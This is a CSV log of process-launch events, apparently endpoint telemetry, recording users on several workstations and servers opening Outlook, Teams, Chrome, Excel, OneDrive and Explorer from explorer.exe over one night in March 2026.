2026-03-05T17:23:00Z,SRV-FILE-01,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T17:26:00Z,WKS-LON-031,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T17:29:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T17:34:00Z,WKS-CHI-009,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T17:39:00Z,WKS-CHI-009,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T17:43:00Z,WKS-CHI-009,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T17:46:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T17:48:00Z,SRV-APP-02,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T17:53:00Z,WKS-BLR-014,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T17:57:00Z,WKS-BLR-022,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T18:00:00Z,SRV-FILE-01,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T18:05:00Z,WKS-BLR-014,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T18:06:00Z,WKS-LON-031,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T18:07:00Z,WKS-BLR-014,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T18:09:00Z,WKS-CHI-009,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T18:11:00Z,SRV-FILE-01,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T18:14:00Z,WKS-BLR-022,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T18:20:00Z,WKS-BLR-022,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T18:21:00Z,WKS-CHI-009,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T18:24:00Z,WKS-LON-031,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T18:25:00Z,WKS-LON-031,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T18:29:00Z,SRV-APP-02,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T18:31:00Z,WKS-CHI-009,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T18:37:00Z,WKS-CHI-009,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T18:43:00Z,WKS-BLR-022,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T18:48:00Z,SRV-APP-02,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T18:52:00Z,WKS-BLR-022,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T18:57:00Z,WKS-BLR-022,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T19:02:00Z,WKS-CHI-009,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T19:07:00Z,SRV-APP-02,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T19:09:00Z,WKS-LON-031,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T19:14:00Z,WKS-CHI-009,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T19:17:00Z,WKS-CHI-009,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T19:20:00Z,SRV-FILE-01,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T19:26:00Z,SRV-APP-02,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T19:32:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T19:38:00Z,WKS-BLR-022,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T19:44:00Z,WKS-BLR-014,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T19:48:00Z,SRV-APP-02,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T19:51:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T19:54:00Z,WKS-BLR-014,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T19:56:00Z,WKS-BLR-014,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T19:57:00Z,WKS-BLR-014,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T20:00:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T20:01:00Z,SRV-APP-02,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T20:04:00Z,WKS-LON-031,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:10:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T20:16:00Z,WKS-BLR-014,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T20:21:00Z,WKS-CHI-009,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:25:00Z,SRV-APP-02,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:28:00Z,WKS-CHI-009,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T20:32:00Z,WKS-BLR-014,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T20:36:00Z,WKS-BLR-022,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T20:37:00Z,WKS-LON-031,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:42:00Z,WKS-BLR-014,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T20:43:00Z,WKS-CHI-009,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:49:00Z,WKS-CHI-009,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T20:50:00Z,WKS-BLR-014,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T20:56:00Z,SRV-FILE-01,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T20:58:00Z,SRV-FILE-01,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T21:02:00Z,SRV-FILE-01,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T21:04:00Z,SRV-FILE-01,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T21:06:00Z,WKS-BLR-022,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T21:08:00Z,WKS-BLR-022,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T21:11:00Z,SRV-APP-02,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T21:12:00Z,WKS-CHI-009,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T21:13:00Z,SRV-FILE-01,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T21:17:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T21:20:00Z,SRV-APP-02,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T21:22:00Z,SRV-FILE-01,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T21:27:00Z,WKS-CHI-009,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T21:33:00Z,WKS-LON-031,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T21:35:00Z,SRV-APP-02,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T21:36:00Z,WKS-LON-031,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T21:42:00Z,WKS-CHI-009,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T21:46:00Z,WKS-BLR-014,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T21:47:00Z,SRV-FILE-01,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T21:49:00Z,SRV-FILE-01,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T21:51:00Z,SRV-APP-02,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T21:54:00Z,WKS-CHI-009,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T21:58:00Z,WKS-BLR-022,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T22:00:00Z,WKS-BLR-014,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T22:04:00Z,WKS-LON-031,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T22:08:00Z,SRV-FILE-01,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T22:14:00Z,WKS-BLR-022,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T22:16:00Z,SRV-FILE-01,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T22:21:00Z,WKS-LON-031,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T22:26:00Z,WKS-BLR-022,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T22:31:00Z,WKS-BLR-014,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T22:34:00Z,WKS-LON-031,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T22:37:00Z,WKS-BLR-022,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T22:38:00Z,WKS-BLR-022,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T22:42:00Z,WKS-BLR-022,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T22:46:00Z,WKS-BLR-022,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T22:48:00Z,WKS-BLR-014,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T22:49:00Z,SRV-FILE-01,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T22:51:00Z,SRV-FILE-01,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T22:54:00Z,SRV-APP-02,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T23:00:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T23:05:00Z,SRV-FILE-01,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T23:08:00Z,SRV-FILE-01,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T23:10:00Z,WKS-LON-031,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T23:16:00Z,WKS-BLR-022,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T23:20:00Z,WKS-BLR-022,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T23:25:00Z,WKS-LON-031,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T23:28:00Z,SRV-APP-02,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T23:32:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T23:38:00Z,WKS-LON-031,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T23:41:00Z,WKS-LON-031,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T23:45:00Z,WKS-CHI-009,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T23:47:00Z,WKS-BLR-022,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T23:51:00Z,SRV-APP-02,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T23:53:00Z,SRV-APP-02,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T23:55:00Z,WKS-BLR-022,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T23:58:00Z,SRV-FILE-01,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T00:00:00Z,WKS-BLR-014,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T00:05:00Z,WKS-BLR-022,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T00:06:00Z,WKS-BLR-022,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T00:10:00Z,WKS-CHI-009,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T00:13:00Z,WKS-BLR-022,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T00:19:00Z,WKS-LON-031,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T00:24:00Z,WKS-BLR-014,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T00:27:00Z,WKS-CHI-009,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T00:33:00Z,SRV-FILE-01,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T00:39:00Z,WKS-CHI-009,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T00:45:00Z,WKS-LON-031,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T00:46:00Z,WKS-CHI-009,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T00:47:00Z,WKS-CHI-009,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T00:51:00Z,SRV-FILE-01,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T00:57:00Z,WKS-BLR-014,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T01:00:00Z,WKS-CHI-009,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T01:06:00Z,WKS-CHI-009,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T01:09:00Z,WKS-LON-031,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T01:11:00Z,SRV-FILE-01,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T01:12:00Z,WKS-BLR-014,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T01:13:00Z,WKS-BLR-014,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:14:00Z,WKS-CHI-009,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T01:16:00Z,WKS-BLR-022,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:21:00Z,WKS-CHI-009,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T01:23:00Z,SRV-FILE-01,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T01:26:00Z,WKS-BLR-022,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T01:30:00Z,SRV-FILE-01,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:36:00Z,SRV-APP-02,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T01:42:00Z,WKS-BLR-014,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T01:45:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:46:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T01:49:00Z,SRV-APP-02,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:52:00Z,WKS-BLR-022,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T01:55:00Z,WKS-LON-031,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T01:56:00Z,SRV-APP-02,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:02:00Z,SRV-APP-02,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T02:05:00Z,WKS-LON-031,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T02:07:00Z,SRV-APP-02,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T02:11:00Z,SRV-APP-02,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T02:15:00Z,WKS-BLR-022,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T02:18:00Z,SRV-APP-02,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T02:20:00Z,WKS-CHI-009,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T02:22:00Z,WKS-BLR-014,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T02:28:00Z,WKS-BLR-014,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:30:00Z,WKS-CHI-009,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:31:00Z,WKS-BLR-014,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:33:00Z,WKS-BLR-014,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:34:00Z,WKS-BLR-014,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T02:37:00Z,WKS-CHI-009,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T02:41:00Z,WKS-LON-031,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:45:00Z,WKS-BLR-022,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T02:50:00Z,WKS-LON-031,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T02:53:00Z,WKS-BLR-022,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T02:59:00Z,WKS-CHI-009,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T03:05:00Z,WKS-BLR-022,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T03:06:00Z,SRV-APP-02,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T03:12:00Z,SRV-FILE-01,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T03:16:00Z,WKS-BLR-014,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T03:20:00Z,SRV-FILE-01,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T03:21:00Z,WKS-BLR-022,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T03:23:00Z,WKS-BLR-022,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T03:29:00Z,WKS-LON-031,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T03:32:00Z,WKS-BLR-014,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T03:37:00Z,SRV-APP-02,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T03:42:00Z,WKS-LON-031,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T03:46:00Z,SRV-APP-02,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T03:51:00Z,WKS-CHI-009,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
